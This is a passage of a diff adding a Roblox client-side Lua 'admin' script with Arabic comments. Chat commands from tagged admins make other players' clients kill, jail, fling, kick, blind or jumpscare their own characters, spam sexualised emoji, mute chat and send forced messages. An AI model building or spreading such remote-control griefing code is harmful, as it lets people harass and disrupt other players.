+        ownerTags = {}
+        adminTags = {}
+    end
+end)
+
+-- ===== نظام السرعة =====
+local function applySpeedEffect(speedValue)
+    local hum = getHumanoid(LocalPlayer)
+    local hrp = getHrp(LocalPlayer)
+    if hum and hrp then
+        if speedConnections[LocalPlayer] then
+            speedConnections[LocalPlayer]:Disconnect()
+            speedConnections[LocalPlayer] = nil
+        end
+        
+        speedConnections[LocalPlayer] = RunService.Heartbeat:Connect(function(dt)
+            if hum.MoveDirection.Magnitude > 0 and hrp and hrp.Parent then
+                local moveDirection = hum.MoveDirection
+                hrp.CFrame = hrp.CFrame + (moveDirection * speedValue * dt)
+            end
+        end)
+    end
+end
+
+local function resetSpeedEffect()
+    if speedConnections[LocalPlayer] then
+        speedConnections[LocalPlayer]:Disconnect()
+        speedConnections[LocalPlayer] = nil
+    end
+    
+    local hum = getHumanoid(LocalPlayer)
+    if hum and originalWalkSpeed then 
+        hum.WalkSpeed = originalWalkSpeed 
+    end
+end
+
+-- ===== نظام السجن =====
+local function makePost(pos)
+    local p = Instance.new("Part")
+    p.Size = Vector3.new(JAIL_SETTINGS.WALL_THICKNESS, JAIL_SETTINGS.WALL_HEIGHT, JAIL_SETTINGS.WALL_THICKNESS)
+    p.Anchored = true
+    p.CanCollide = true
+    p.Material = Enum.Material.Metal
+    p.Color = JAIL_SETTINGS.POSTS_COLOR
+    p.Position = pos
+    p.Parent = workspace
+    return p
+end
+
+local function makeRoof(center)
+    local roof = Instance.new("Part")
+    roof.Size = Vector3.new(JAIL_SETTINGS.WALL_SIZE, JAIL_SETTINGS.WALL_THICKNESS, JAIL_SETTINGS.WALL_SIZE)
+    roof.Anchored = true
+    roof.CanCollide = true
+    roof.Material = Enum.Material.Metal
+    roof.Color = JAIL_SETTINGS.POSTS_COLOR
+    roof.Position = Vector3.new(center.X, center.Y - JAIL_SETTINGS.FLOOR_OFFSET + JAIL_SETTINGS.WALL_HEIGHT, center.Z)
+    roof.Parent = workspace
+    return roof
+end
+
+local function createJailForPlayer(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then 
+        return false 
+    end
+    
+    local character = targetPlayer.Character
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then 
+        return false 
+    end
+    
+    local jailCenter = humanoidRootPart.Position
+    
+    if jails[targetPlayer.Name] then 
+        removeJail(targetPlayer.Name) 
+    end
+    
+    local posts = {}
+    local y = jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET + JAIL_SETTINGS.WALL_HEIGHT/2
+    local half = JAIL_SETTINGS.WALL_SIZE/2
+    local step = JAIL_SETTINGS.POSTS_SPACING
+
+    for x = -half, half, step do
+        table.insert(posts, makePost(Vector3.new(jailCenter.X + x, y, jailCenter.Z + half)))
+        table.insert(posts, makePost(Vector3.new(jailCenter.X + x, y, jailCenter.Z - half)))
+    end
+
+    for z = -half + step, half - step, step do
+        table.insert(posts, makePost(Vector3.new(jailCenter.X + half, y, jailCenter.Z + z)))
+        table.insert(posts, makePost(Vector3.new(jailCenter.X - half, y, jailCenter.Z + z)))
+    end
+
+    local roof = makeRoof(jailCenter)
+    
+    jails[targetPlayer.Name] = {
+        posts = posts,
+        roof = roof,
+        center = jailCenter,
+        connections = {}
+    }
+    
+    local function enforceJail()
+        if not targetPlayer.Character then 
+            return 
+        end
+        local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if not hrp then 
+            return 
+        end
+        
+        local pos = hrp.Position
+        local limit = JAIL_SETTINGS.WALL_SIZE/2
+        local minY = jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET
+        local maxY = minY + JAIL_SETTINGS.WALL_HEIGHT
+        
+        if pos.X < jailCenter.X - limit or pos.X > jailCenter.X + limit or
+           pos.Z < jailCenter.Z - limit or pos.Z > jailCenter.Z + limit or
+           pos.Y < minY or pos.Y > maxY then
+            hrp.CFrame = CFrame.new(jailCenter.X, minY + 3, jailCenter.Z)
+        end
+    end
+    
+    local enforceConnection = RunService.Heartbeat:Connect(enforceJail)
+    table.insert(jails[targetPlayer.Name].connections, enforceConnection)
+    
+    local respawnConnection = targetPlayer.CharacterAdded:Connect(function(newChar)
+        task.wait(0.5)
+        local newHrp = newChar:WaitForChild("HumanoidRootPart")
+        if newHrp then
+            newHrp.CFrame = CFrame.new(jailCenter.X, jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET + 3, jailCenter.Z)
+        end
+    end)
+    table.insert(jails[targetPlayer.Name].connections, respawnConnection)
+    
+    humanoidRootPart.CFrame = CFrame.new(jailCenter.X, jailCenter.Y - JAIL_SETTINGS.FLOOR_OFFSET + 3, jailCenter.Z)
+    
+    return true
+end
+
+local function removeJail(playerName)
+    if not jails[playerName] then return end
+    
+    for _, connection in ipairs(jails[playerName].connections) do
+        pcall(function() connection:Disconnect() end)
+    end
+    
+    if jails[playerName].roof and jails[playerName].roof.Parent then
+        jails[playerName].roof:Destroy()
+    end
+    
+    for _, post in ipairs(jails[playerName].posts) do
+        if post and post.Parent then
+            post:Destroy()
+        end
+    end
+    
+    jails[playerName] = nil
+end
+
+-- ===== نظام Cuffs المصحح (اللاعب يكون أمامك) =====
+local function applyCuffsAnimation(targetCharacter)
+    if not targetCharacter then return {} end
+    local humanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return {} end
+    
+    local effects = {}
+    humanoid.WalkSpeed = 8
+    
+    for _, partName in pairs({"LeftHand", "RightHand", "Left Arm", "Right Arm"}) do
+        local part = targetCharacter:FindFirstChild(partName)
+        if part then
+            part.BrickColor = BrickColor.new("Gold")
+            part.Material = Enum.Material.Neon
+        end
+    end
+    
+    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
+    if humanoidRootPart then
+        local particleAttachment = Instance.new("Attachment")
+        particleAttachment.Parent = humanoidRootPart
+        
+        local particleEmitter = Instance.new("ParticleEmitter")
+        particleEmitter.Parent = particleAttachment
+        particleEmitter.Color = ColorSequence.new(Color3.fromRGB(255, 215, 0))
+        particleEmitter.Size = NumberSequence.new(0.2)
+        particleEmitter.Lifetime = NumberRange.new(0.5, 1)
+        particleEmitter.Rate = 15
+        particleEmitter.LightEmission = 0.8
+        particleEmitter.SpreadAngle = Vector2.new(45, 45)
+        
+        table.insert(effects, particleAttachment)
+        table.insert(effects, particleEmitter)
+    end
+    
+    return effects
+end
+
+local function removeCuffsAnimation(targetCharacter, effects)
+    if effects then 
+        for _, effect in pairs(effects) do 
+            if effect and effect.Parent then 
+                effect:Destroy() 
+            end 
+        end 
+    end
+    if not targetCharacter then return end
+    
+    local humanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 16
+        for _, part in pairs(targetCharacter:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.BrickColor = BrickColor.new("Medium stone grey")
+                part.Material = Enum.Material.Plastic
+            end
+        end
+    end
+end
+
+local function createCuffsForPlayer(targetPlayer, adminPlayer)
+    if not targetPlayer or not targetPlayer.Character or not adminPlayer or not adminPlayer.Character then 
+        return false 
+    end
+    
+    if cuffsConnections[targetPlayer] then 
+        cuffsConnections[targetPlayer]:Disconnect() 
+        cuffsConnections[targetPlayer] = nil 
+    end
+    if cuffsEffects[targetPlayer] then 
+        removeCuffsAnimation(targetPlayer.Character, cuffsEffects[targetPlayer]) 
+        cuffsEffects[targetPlayer] = nil 
+    end
+    
+    local effects = applyCuffsAnimation(targetPlayer.Character)
+    cuffsEffects[targetPlayer] = effects
+    
+    cuffsConnections[targetPlayer] = RunService.RenderStepped:Connect(function()
+        if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if cuffsConnections[targetPlayer] then 
+                cuffsConnections[targetPlayer]:Disconnect() 
+                cuffsConnections[targetPlayer] = nil 
+            end
+            return
+        end
+        if not adminPlayer.Character or not adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if cuffsConnections[targetPlayer] then 
+                cuffsConnections[targetPlayer]:Disconnect() 
+                cuffsConnections[targetPlayer] = nil 
+            end
+            return
+        end
+        
+        local adminRoot = adminPlayer.Character.HumanoidRootPart
+        local targetRoot = targetPlayer.Character.HumanoidRootPart
+        
+        local offset = adminRoot.CFrame * CFrame.new(0, 0, -4)
+        targetRoot.CFrame = CFrame.new(offset.Position, adminRoot.Position)
+        targetRoot.Velocity = Vector3.zero
+        targetRoot.RotVelocity = Vector3.zero
+    end)
+    
+    return true
+end
+
+local function removeCuffsFromPlayer(targetPlayer)
+    if cuffsConnections[targetPlayer] then 
+        cuffsConnections[targetPlayer]:Disconnect() 
+        cuffsConnections[targetPlayer] = nil 
+    end
+    if cuffsEffects[targetPlayer] and targetPlayer.Character then 
+        removeCuffsAnimation(targetPlayer.Character, cuffsEffects[targetPlayer]) 
+        cuffsEffects[targetPlayer] = nil 
+    end
+    return true
+end
+
+local function isRestrictedPlace() 
+    local placeId = game.PlaceId
+    for _, id in ipairs(RESTRICTED_PLACE_IDS) do 
+        if placeId == id then 
+            return true 
+        end 
+    end
+    return false 
+end
+
+-- ===== دوال التأثيرات =====
+local function setNoRender(enabled)
+    if enabled then 
+        RunService:Set3dRenderingEnabled(false) 
+        persistent.noRender = true
+    else 
+        RunService:Set3dRenderingEnabled(true) 
+        persistent.noRender = false 
+    end
+end
+
+local function setNoSpeak(enabled)
+    if enabled then
+        persistent.nospeak = true
+        pcall(function() 
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) 
+        end)
+        
+        local chatGui = LocalPlayer.PlayerGui:FindFirstChild("Chat")
+        if chatGui then 
+            chatGui.Enabled = false 
+        end
+        
+        for _, v in ipairs(messages) do 
+            pcall(function() 
+                if v and v.Parent then 
+                    v:Destroy() 
+                end 
+            end) 
+        end
+        messages = {} 
+        seenKeys = {} 
+        scroll.CanvasSize = UDim2.new(0,0,0,0)
+    else
+        persistent.nospeak = false
+        pcall(function() 
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) 
+        end)
+        
+        local chatGui = LocalPlayer.PlayerGui:FindFirstChild("Chat")
+        if chatGui then 
+            chatGui.Enabled = true 
+        end
+    end
+end
+
+local function setScream(enabled)
+    if enabled then
+        if screamFrame then 
+            screamFrame:Destroy() 
+            screamFrame = nil 
+        end
+        screamFrame = Instance.new("Frame", screenGui)
+        screamFrame.Name = "ScreamEffect"
+        screamFrame.Size = UDim2.new(1, 0, 1, 0)
+        screamFrame.Position = UDim2.new(0, 0, 0, 0)
+        screamFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+        screamFrame.BorderSizePixel = 0
+        screamFrame.ZIndex = 999999
+        
+        local screamImage = Instance.new("ImageLabel", screamFrame)
+        screamImage.Size = UDim2.new(1, 0, 1, 0)
+        screamImage.Position = UDim2.new(0, 0, 0, 0)
+        screamImage.BackgroundTransparency = 1
+        screamImage.Image = SCREAM_IMAGE_ID
+        screamImage.ScaleType = Enum.ScaleType.Stretch
+        screamImage.ZIndex = 1000000
+        
+        pcall(function()
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://6269646683"
+            sound.Parent = game:GetService("SoundService")
+            sound:Play()
+            Debris:AddItem(sound, 10)
+        end)
+    else
+        if screamFrame then 
+            screamFrame:Destroy() 
+            screamFrame = nil 
+        end
+    end
+end
+
+local function setFun(enabled)
+    if enabled then
+        if funConn then 
+            funConn:Disconnect() 
+        end
+        pcall(function()
+            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then 
+                originalWalkSpeed = humanoid.WalkSpeed 
+                humanoid.WalkSpeed = 0 
+            end
+        end)
+        funConn = RunService.Heartbeat:Connect(function()
+            pcall(function()
+                local character = LocalPlayer.Character
+                if character and character:FindFirstChild("Humanoid") then
+                    local humanoid = character:FindFirstChild("Humanoid")
+                    local hrp = character:FindFirstChild("HumanoidRootPart")
+                    if humanoid and hrp then
+                        local moveDirection = humanoid.MoveDirection
+                        if moveDirection.Magnitude > 0.1 then
+                            local newPosition = hrp.Position - (moveDirection * 0.5)
+                            hrp.CFrame = CFrame.new(newPosition, newPosition + moveDirection)
+                        end
+                    end
+                end
+            end)
+        end)
+    else
+        if funConn then
+            funConn:Disconnect() 
+            funConn = nil
+            pcall(function()
+                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then 
+                    humanoid.WalkSpeed = originalWalkSpeed 
+                end
+            end)
+        end
+    end
+end
+
+-- ===== المتغيرات المستمرة =====
+persistent = persistent or {
+    vanished = false, noclip = false, nospeak = false, blind = false, lay = false,
+    slow = false, milk = false, flash = false, nohair = false,
+    dance = false, spin = false, scream = false, fun = false,
+    noRender = false, queuedCommands = {}
+}
+persistent.savedAccessories = persistent.savedAccessories or {}
+
+local blindFrame, flashFrame, milkContainer, milkConn, danceTrack, screamFrame, spinConn
+
+-- ===== دالة إعادة تطبيق التأثيرات =====
+local function ensureCharacterThenRun(fn)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then 
+        fn(LocalPlayer.Character) 
+        return 
+    end
+    local conn
+    conn = LocalPlayer.CharacterAdded:Connect(function(char)
+        if conn then 
+            conn:Disconnect() 
+            conn = nil 
+        end
+        task.wait(0.2)
+        fn(char)
+    end)
+end
+
+local function enqueueCommand(admin, cmd, args) 
+    table.insert(persistent.queuedCommands, {admin = admin, cmd = cmd, args = args or {}}) 
+end
+
+local function processQueuedCommands()
+    if not persistent.queuedCommands or #persistent.queuedCommands == 0 then 
+        return 
+    end
+    local q = persistent.queuedCommands
+    persistent.queuedCommands = {}
+    for _, item in ipairs(q) do 
+        pcall(function() 
+            if Commands[item.cmd] then 
+                pcall(function() 
+                    Commands[item.cmd](item.admin, table.unpack(item.args)) 
+                end) 
+            end 
+        end) 
+    end
+end
+
+local function reapplyPersistent()
+    local pg = LocalPlayer:FindFirstChild("PlayerGui")
+    if pg then 
+        screenGui.Parent = pg 
+    end
+    
+    ensureCharacterThenRun(function(char)
+        local hum = getHumanoid(LocalPlayer)
+        local hrp = getHrp(LocalPlayer)
+        
+        if persistent.vanished and char then
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Transparency = 1
+                end
+            end
+        end
+        
+        if persistent.noclip and char then
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.CanCollide = false
+                end
+            end
+        end
+        
+        if persistent.lay and hrp and hum then
+            hum.PlatformStand = true
+            hrp.CFrame = hrp.CFrame * CFrame.Angles(math.rad(90),0,0)
+        end
+        
+        if persistent.slow and hum then
+            hum.WalkSpeed = 4
+            applySpeedEffect(4)
+        else
+            if hum and originalWalkSpeed then
+                hum.WalkSpeed = originalWalkSpeed
+            end
+            resetSpeedEffect()
+        end
+        
+        if persistent.dance and hum then
+            pcall(function()
+                local isR15 = hum.RigType == Enum.HumanoidRigType.R15
+                local danceAnimationId = isR15 and "rbxassetid://507771019" or "rbxassetid://507770268"
+                if danceTrack and danceTrack.IsPlaying then 
+                    danceTrack:Stop() 
+                end
+                local anim = Instance.new("Animation")
+                anim.AnimationId = danceAnimationId
+                danceTrack = hum:LoadAnimation(anim)
+                danceTrack.Looped = true
+                danceTrack:Play()
+            end)
+        else
+            if danceTrack and danceTrack.IsPlaying then 
+                pcall(function() 
+                    danceTrack:Stop() 
+                end) 
+                danceTrack = nil 
+            end
+        end
+        
+        if persistent.spin and hrp then
+            if spinConn then 
+                spinConn:Disconnect() 
+                spinConn = nil 
+            end
+            spinConn = RunService.Heartbeat:Connect(function(dt)
+                local root = hrp
+                if root and root.Parent and persistent.spin then
+                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(3600 * dt), 0)
+                else
+                    if spinConn then 
+                        spinConn:Disconnect() 
+                        spinConn = nil 
+                    end
+                end
+            end)
+        else
+            if spinConn then 
+                spinConn:Disconnect() 
+                spinConn = nil 
+            end
+        end
+        
+        if persistent.nohair and char then
+            for _, acc in ipairs(char:GetChildren()) do
+                if acc:IsA("Accessory") then
+                    local aname = acc.Name
+                    if not persistent.savedAccessories[aname] then
+                        pcall(function() 
+                            persistent.savedAccessories[aname] = acc:Clone() 
+                        end)
+                    end
+                    pcall(function() 
+                        acc:Destroy() 
+                    end)
+                end
+            end
+            local head = char:FindFirstChild("Head")
+            if head then
+                for _, c in ipairs(head:GetChildren()) do
+                    if c:IsA("SpecialMesh") or tostring(c.Name):lower():find("hair") then
+                        pcall(function() 
+                            c:Destroy() 
+                        end)
+                    end
+                end
+            end
+        end
+        
+        setNoSpeak(persistent.nospeak)
+        setScream(persistent.scream)
+        setFun(persistent.fun)
+        setNoRender(persistent.noRender)
+        
+        if persistent.blind then
+            if not blindFrame or not blindFrame.Parent then
+                blindFrame = Instance.new("Frame", screenGui)
+                blindFrame.Name = "__blind_full"
+                blindFrame.Size = UDim2.new(1,0,1,0)
+                blindFrame.Position = UDim2.new(0,0,0,0)
+                blindFrame.BackgroundColor3 = Color3.new(0,0,0)
+                blindFrame.BorderSizePixel = 0
+                blindFrame.ZIndex = 999999
+            end
+        else
+            if blindFrame and blindFrame.Parent then 
+                blindFrame:Destroy() 
+                blindFrame = nil 
+            end
+        end
+        
+        if persistent.flash then
+            if not flashFrame or not flashFrame.Parent then
+                flashFrame = Instance.new("Frame", screenGui)
+                flashFrame.Name = "__flash_full"
+                flashFrame.Size = UDim2.new(1,0,1,0)
+                flashFrame.Position = UDim2.new(0,0,0,0)
+                flashFrame.BackgroundColor3 = Color3.new(1,1,1)
+                flashFrame.BorderSizePixel = 0
+                flashFrame.ZIndex = 999999
+                flashFrame.BackgroundTransparency = 0
+            end
+        else
+            if flashFrame and flashFrame.Parent then 
+                flashFrame:Destroy() 
+                flashFrame = nil 
+            end
+        end
+        
+        if persistent.milk then
+            if not milkConn then
+                if not milkContainer or not milkContainer.Parent then 
+                    milkContainer = Instance.new("Folder", screenGui)
+                    milkContainer.Name = "__milk_emojis" 
+                end
+                milkConn = RunService.Heartbeat:Connect(function(dt)
+                    if not persistent.milk then 
+                        return 
+                    end
+                    local spawnCount = math.random(1,3)
+                    for i=1, spawnCount do
+                        local x = math.random(0,100)/100
+                        local lbl = Instance.new("TextLabel")
+                        lbl.Size = UDim2.new(0,50,0,50)
+                        lbl.Position = UDim2.new(x, -25, -0.15 - math.random()*0.4, 0)
+                        lbl.BackgroundTransparency = 1
+                        lbl.Text = "💦"
+                        lbl.TextScaled = true
+                        lbl.Font = Enum.Font.SourceSans
+                        lbl.TextColor3 = Color3.new(1,1,1)
+                        lbl.ZIndex = 999998
+                        lbl.Parent = milkContainer
+
+                        local duration = math.random(8,14)/10
+                        local endPos = UDim2.new(x, -25, 1.3, 0)
+                        local tweenInfo = TweenService:Create(lbl, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Position = endPos})
+                        tweenInfo:Play()
+                        delay(duration + 0.05, function() 
+                            pcall(function() 
+                                if lbl and lbl.Parent then 
+                                    lbl:Destroy() 
+                                end 
+                            end) 
+                        end)
+                    end
+                end)
+            end
+        else
+            if milkConn then 
+                milkConn:Disconnect() 
+                milkConn = nil 
+            end
+            if milkContainer and milkContainer.Parent then
+                for _, c in ipairs(milkContainer:GetChildren()) do 
+                    pcall(function() 
+                        c:Destroy() 
+                    end) 
+                end
+                milkContainer:Destroy()
+                milkContainer = nil
+            end
+        end
+        
+        processQueuedCommands()
+    end)
+end
+
+LocalPlayer.CharacterAdded:Connect(function() 
+    task.wait(1.1) 
+    reapplyPersistent() 
+end)
+
+LocalPlayer.CharacterRemoving:Connect(function(char)
+    pcall(function() 
+        if danceTrack and danceTrack.IsPlaying then 
+            danceTrack:Stop() 
+        end 
+    end)
+    if spinConn then 
+        spinConn:Disconnect() 
+        spinConn = nil 
+    end
+    if milkConn then 
+        milkConn:Disconnect() 
+        milkConn = nil 
+    end
+    if funConn then 
+        funConn:Disconnect() 
+        funConn = nil 
+    end
+end)
+
+-- ===== تعريف الأوامر =====
+local Commands = {}
+
+local function amILocalTarget(name)
+    if not name then 
+        return false 
+    end
+    if lower(name) == lower(LocalPlayer.Name) then 
+        return true 
+    end
+    if ALLOW_PARTIAL_MATCH and string.find(lower(LocalPlayer.Name), lower(name), 1, true) then 
+        return true 
+    end
+    return false
+end
+
+local function runOrEnqueue(admin, cmdName, args)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+        if Commands[cmdName] then 
+            pcall(function() 
+                Commands[cmdName](admin, table.unpack(args or {})) 
+            end) 
+        end
+    else 
+        enqueueCommand(admin, cmdName, args) 
+    end
+end
+
+-- ===== أوامر الحركة =====
+function Commands.bring(admin, target) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "bring_exec", {admin, target}) 
+end
+
+function Commands.bring_exec(admin, target)
+    local a = Players:FindFirstChild(admin) or findPlayerByPartial(admin)
+    if a and a.Character and getHrp(a) and getHrp(LocalPlayer) then
+        getHrp(LocalPlayer).CFrame = getHrp(a).CFrame
+    end
+end
+
+function Commands.kill(admin, target) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "kill_exec", {admin, target}) 
+end
+
+function Commands.kill_exec(admin, target)
+    local hum = getHumanoid(LocalPlayer)
+    if hum then 
+        hum.Health = 0 
+    end
+end
+
+function Commands.freeze(admin, target) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "freeze_exec", {admin, target}) 
+end
+
+function Commands.freeze_exec(admin, target)
+    local hum = getHumanoid(LocalPlayer)
+    if hum then 
+        hum.PlatformStand = true 
+    end
+end
+
+function Commands.unfreeze(admin, target) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "unfreeze_exec", {admin, target}) 
+end
+
+function Commands.unfreeze_exec(admin, target)
+    local hum = getHumanoid(LocalPlayer)
+    if hum then 
+        hum.PlatformStand = false 
+    end
+end
+
+function Commands.teleportto(admin, target) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "teleportto_exec", {admin, target}) 
+end
+
+function Commands.teleportto_exec(admin, target)
+    local t = findPlayerByPartial(target)
+    if t and t.Character and getHrp(t) and getHrp(LocalPlayer) then
+        getHrp(LocalPlayer).CFrame = getHrp(t).CFrame
+    end
+end
+
+function Commands.speed(admin, target, value) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "speed_exec", {admin, target, value}) 
+end
+
+function Commands.speed_exec(admin, target, value)
+    local v = tonumber(value) or 16
+    applySpeedEffect(v)
+end
+
+function Commands.resetSpeed(admin, target) 
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    runOrEnqueue(admin, "resetSpeed_exec", {admin, target}) 
+end
+
+function Commands.resetSpeed_exec(admin, target)
+    resetSpeedEffect()
+end
+
+-- ===== أوامر التأثيرات =====
+function Commands.vanish(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.vanished = true
+    reapplyPersistent()
+end
+
+function Commands.unvanish(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.vanished = false
+    reapplyPersistent()
+end
+
+function Commands.noclip(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.noclip = not persistent.noclip
+    reapplyPersistent()
+end
+
+function Commands.yassin(admin, target)
+    pcall(function()
+        if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+            TextChatService.TextChannels.RBXGeneral:SendAsync("ياسين عمي")
+        else
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ياسين عمي","All")
+        end
+    end)
+end
+
+-- ===== أمر kick المعدل مع سبب =====
+function Commands.kick(admin, target, ...)
+    if not target then 
+        return 
+    end
+    if not amILocalTarget(target) then 
+        return 
+    end
+    
+    local reason = table.concat({...}, " ")
+    if reason == "" then reason = "لا يوجد سبب" end
+    
+    local kickMessage = "🛑 تم طردك بواسطة " .. admin .. "\n📝 السبب: " .. reason
+    pcall(function() 
+        LocalPlayer:Kick(kickMessage) 
+    end)
+end
+
+function Commands.milk(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.milk = true
+    reapplyPersistent()
+end
+
+function Commands.unmilk(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.milk = false
+    reapplyPersistent()
+end
+
+-- ===== أمر ban (بدل lay) حصري لـ # فقط =====
+function Commands.ban(admin, target)
+    if not canUseBanCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر فقط للأدمن المميزين (#)")
+        return
+    end
+    if not amILocalTarget(target) then return end
+    persistent.lay = true
+    reapplyPersistent()
+end
+
+function Commands.unban(admin, target)
+    if not canUseBanCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر فقط للأدمن المميزين (#)")
+        return
+    end
+    if not amILocalTarget(target) then return end
+    persistent.lay = false
+    reapplyPersistent()
+    pcall(function()
+        local hum = getHumanoid(LocalPlayer)
+        if hum then
+            hum.PlatformStand = false
+        end
+    end)
+end
+
+function Commands.dchat(admin, target)
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    local t = findPlayerByPartial(target)
+    if not t then
+        if amILocalTarget(target) then 
+            t = LocalPlayer 
+        end
+    end
+    
+    if not t then 
+        addMessage("SYSTEM", "❌ لم يتم العثور على اللاعب")
+        return 
+    end
+    
+    if t == LocalPlayer then
+        persistent.nospeak = true
+        reapplyPersistent()
+        addMessage("SYSTEM", "🔇 تم تعطيل الشات المحلي")
+    else
+        blockPlayerChat(t)
+        addMessage("SYSTEM", "🔇 تم منع الشات لـ " .. t.Name)
+    end
+end
+
+function Commands.rchat(admin, target)
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    local t = findPlayerByPartial(target)
+    if not t then
+        if amILocalTarget(target) then 
+            t = LocalPlayer 
+        end
+    end
+    
+    if not t then 
+        addMessage("SYSTEM", "❌ لم يتم العثور على اللاعب")
+        return 
+    end
+    
+    if t == LocalPlayer then
+        persistent.nospeak = false
+        reapplyPersistent()
+        addMessage("SYSTEM", "🔊 تم إعادة تفعيل الشات المحلي")
+    else
+        unblockPlayerChat(t)
+        addMessage("SYSTEM", "🔊 تم إعادة تفعيل الشات لـ " .. t.Name)
+    end
+end
+
+function Commands.blind(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.blind = true
+    reapplyPersistent()
+end
+
+function Commands.unblind(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.blind = false
+    reapplyPersistent()
+end
+
+function Commands.fling(admin, target)
+    if isRestrictedPlace() and admin:lower() ~= "lol21536544" then
+        addMessage("SYSTEM", "❌ هذا الأمر غير مسموح في هذا البلايس")
+        return
+    end
+    
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    runOrEnqueue(admin, "fling_exec", {admin, target})
+end
+
+function Commands.fling_exec(admin, target)
+    local hrp = getHrp(LocalPlayer)
+    if not hrp then 
+        return 
+    end
+    local bv = Instance.new("BodyVelocity")
+    bv.Velocity = Vector3.new((math.random()-0.5)*3000, 1500, (math.random()-0.5)*3000)
+    bv.MaxForce = Vector3.new(1e8,1e8,1e8)
+    bv.Parent = hrp
+    Debris:AddItem(bv, 0.9)
+end
+
+function Commands.nohair(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.nohair = true
+    reapplyPersistent()
+end
+
+function Commands.rehair(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.nohair = false
+    reapplyPersistent()
+end
+
+function Commands.slow(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.slow = true
+    reapplyPersistent()
+end
+
+function Commands.unslow(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.slow = false
+    reapplyPersistent()
+end
+
+function Commands.flash(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.flash = true
+    reapplyPersistent()
+end
+
+function Commands.unflash(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.flash = false
+    reapplyPersistent()
+end
+
+function Commands.dance(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.dance = true
+    reapplyPersistent()
+end
+
+function Commands.undance(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.dance = false
+    reapplyPersistent()
+end
+
+function Commands.spin(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.spin = true
+    reapplyPersistent()
+end
+
+function Commands.unspin(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.spin = false
+    reapplyPersistent()
+end
+
+function Commands.scream(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.scream = true
+    reapplyPersistent()
+end
+
